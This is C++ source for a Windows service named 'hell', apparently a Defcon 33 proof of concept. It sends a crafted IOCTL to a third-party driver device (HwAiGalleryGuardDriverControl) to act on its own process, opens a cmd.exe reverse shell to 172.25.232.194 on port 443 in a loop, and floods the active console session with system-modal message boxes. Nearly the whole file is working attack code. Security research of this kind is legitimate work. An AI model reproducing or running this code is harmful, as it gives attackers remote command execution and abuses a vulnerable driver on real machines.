#include <winsock2.h>
#include <windows.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <lmcons.h>
#include <ws2tcpip.h>
#include <string>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wtsapi32.lib")
#define DEVICE_NAME "\\\\.\\HwAiGalleryGuardDriverControl"
#define IOCTL_MY_CUSTOM_CODE 0x222004

SERVICE_STATUS        ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;


DWORD WINAPI FloodSessionMessages(LPVOID);
void     SendSessionMessage(const std::wstring& caption, const std::wstring& text);

void WriteToLog(const char* str) {
    FILE* log = fopen("C:\\hellLog.txt", "a+");
    if (log) {
        fprintf(log, "%s\n", str);
        fclose(log);
    }
}

DWORD FindProcessId(const std::wstring& processName) {
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(entry);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName.c_str()) == 0) {
                DWORD pid = entry.th32ProcessID;
                CloseHandle(snapshot);
                return pid;
            }
        } while (Process32NextW(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

void ReverseShell() {
    WSADATA wsaData;
    SOCKET sock;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family      = AF_INET;
    server.sin_port        = htons(443);
    server.sin_addr.s_addr = inet_addr("172.25.232.194");

    if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
        WriteToLog("Error: No se pudo conectar al servidor.");
        return;
    }
    WriteToLog("Conectado al servidor");

    ZeroMemory(&si, sizeof(si));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = si.hStdOutput = si.hStdError = (HANDLE)sock;

    if (!CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        WriteToLog("Error al iniciar cmd.exe");
        closesocket(sock);
        return;
    }
    WriteToLog("cmd.exe iniciado correctamente");

    WaitForSingleObject(pi.hProcess, INFINITE);
    closesocket(sock);
    WSACleanup();
}

void SendIoctl() {
    DWORD pid = FindProcessId(L"hell.exe");
    if (pid == 0) {
        WriteToLog("Process not found");
        return;
    }

    const DWORD bufferSize = 0x194;
    unsigned char inputBuffer[bufferSize] = {0};
    char          outputBuffer[bufferSize] = {0};
    DWORD         bytesReturned = 0;

    *(int*)(inputBuffer)            = 0x2bd;
    *(DWORD*)(inputBuffer + 0x04)   = pid;
    wchar_t* processPath            = (wchar_t*)(inputBuffer + 0x0C);
    wcscpy_s(processPath, 0x96, L"C:\\hell.exe");
    wchar_t* processName            = (wchar_t*)(inputBuffer + 0x134);
    wcscpy_s(processName, 0x2A, L"ABhell");

    HANDLE hDevice = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hDevice == INVALID_HANDLE_VALUE) {
        WriteToLog("Failed to open device");
        return;
    }

    BOOL result = DeviceIoControl(
        hDevice,
        IOCTL_MY_CUSTOM_CODE,
        inputBuffer,  sizeof(inputBuffer),
        outputBuffer, sizeof(outputBuffer),
        &bytesReturned,
        NULL
    );
    if (!result) {
        WriteToLog("DeviceIoControl failed");
    }
    CloseHandle(hDevice);
}


void SendSessionMessage(const std::wstring& caption, const std::wstring& text) {
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    DWORD response  = 0;
    WTSSendMessageW(
        WTS_CURRENT_SERVER_HANDLE,
        sessionId,
        (LPWSTR)caption.c_str(),
        DWORD((caption.size()+1) * sizeof(wchar_t)),
        (LPWSTR)text.c_str(),
        DWORD((text.size()+1) * sizeof(wchar_t)),
        MB_OK | MB_SYSTEMMODAL,
        0,
        &response,
        FALSE
    );
}

DWORD WINAPI FloodSessionMessages(LPVOID) {
    DWORD sessionId = WTSGetActiveConsoleSessionId();
    LPWSTR pUser    = nullptr;
    DWORD  len      = 0;

    if (!WTSQuerySessionInformationW(
            WTS_CURRENT_SERVER_HANDLE,
            sessionId,
            WTSUserName,
            &pUser,
            &len)) {
        pUser = const_cast<LPWSTR>(L"<unknown>");
    }

    std::wstring caption  = L"Defcon 33";
    std::wstring baseText = L"Hello Defcon 33\n";
    baseText;

    if (len > 0) WTSFreeMemory(pUser);

    while (true) {
        SendSessionMessage(caption, baseText);
        Sleep(100);
    }
    return 0;
}


void WINAPI ServiceControlHandler(DWORD controlCode) {
    if (controlCode == SERVICE_CONTROL_STOP) {
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
        WriteToLog("Service stopped");
    }
}

void WINAPI ServiceMain(DWORD /*argc*/, LPSTR* /*argv*/) {
    ServiceStatus.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState            = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted        = SERVICE_ACCEPT_STOP;
    ServiceStatus.dwWin32ExitCode           = 0;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwCheckPoint              = 0;
    ServiceStatus.dwWaitHint                = 0;

    ServiceStatusHandle = RegisterServiceCtrlHandlerA("hell", ServiceControlHandler);
    if (!ServiceStatusHandle) {
        WriteToLog("Failed to register service control handler");
        return;
    }

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    WriteToLog("Service running");

    HANDLE hFlood = CreateThread(NULL, 0, FloodSessionMessages, NULL, 0, NULL);
    if (hFlood) CloseHandle(hFlood);

    while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
        SendIoctl();
        ReverseShell();
        Sleep(100000);
    }
}

int main() {
    SERVICE_TABLE_ENTRY table[] = {
        { (LPSTR)"hell", (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        { NULL, NULL }
    };
    StartServiceCtrlDispatcherA(table);
    return 0;
}